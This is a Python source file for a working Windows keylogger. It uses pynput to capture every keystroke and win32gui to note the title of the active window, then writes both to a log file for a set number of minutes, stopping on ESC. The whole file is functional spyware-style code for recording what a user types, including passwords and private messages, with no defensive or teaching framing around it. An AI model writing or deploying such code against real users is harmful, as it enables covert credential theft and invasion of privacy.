from pynput import keyboard
import win32gui
import time

# Specify the log file, will be dynamically set by filename when logging
log_file = None

# Initialize variables
last_key_time = time.time()  # Track the last time a key was pressed
inactive_duration = 3  # 3 seconds of inactivity
current_window = None  # Store the current window title

# Function to log key presses
def on_press(key):
    global last_key_time, current_window

    # Update the last key time on any key press
    last_key_time = time.time()

    # Get the active window
    new_window = get_active_window()

    # Check if the window has changed
    if new_window != current_window:
        current_window = new_window
        log_window_change(current_window)

    try:
        # Get the character representation of the key
        if hasattr(key, 'char') and key.char is not None:
            log_key(key.char)  # Log regular characters
        else:
            # Handle special keys
            if key == keyboard.Key.enter:
                log_key("\n")  # Move to the next line on Enter
            elif key == keyboard.Key.space:
                log_key(" ")  # Log space as a space character
            elif key == keyboard.Key.backspace:
                log_key("[back] ")  # Log backspace as [back]
            elif key == keyboard.Key.esc:
                log_key("[esc] ")  # Log ESC as [esc]
            elif key in (keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right):
                pass  # Ignore arrow keys
            else:
                # For other special keys, log them in brackets
                log_key(f"[{key.name}] ")

    except AttributeError:
        pass

# Function to log the current window title
def log_window_change(window_title):
    global log_file
    with open(log_file, "a", encoding="utf-8") as f:  # Open file with UTF-8 encoding
        f.write(f"\n\n=== {window_title} ===\n{'-' * len(window_title)}\n")

# Function to log key presses
def log_key(key_str):
    global last_key_time, log_file
    # Check for inactivity before logging
    current_time = time.time()
    if current_time - last_key_time > inactive_duration and key_str != "\n":
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("\n")  # Move to the next line after inactivity

    # Log the key to the file
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(key_str)

# Function to get the active window title (Windows only)
def get_active_window():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

# Function to handle key release
def on_release(key):
    if key == keyboard.Key.esc:  # Press ESC to stop the keylogger
        return False

# Start the keylogger and log for a specified duration (in minutes)
def start_logging(duration, filename):
    global log_file
    log_file = filename  # Set the filename for logging

    # Clear the existing log file
    with open(log_file, "w", encoding="utf-8") as f:
        f.write("")

    # Start listening to keystrokes for the specified duration
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join(timeout=duration * 60)

    return filename  # Return the log file name for further processing
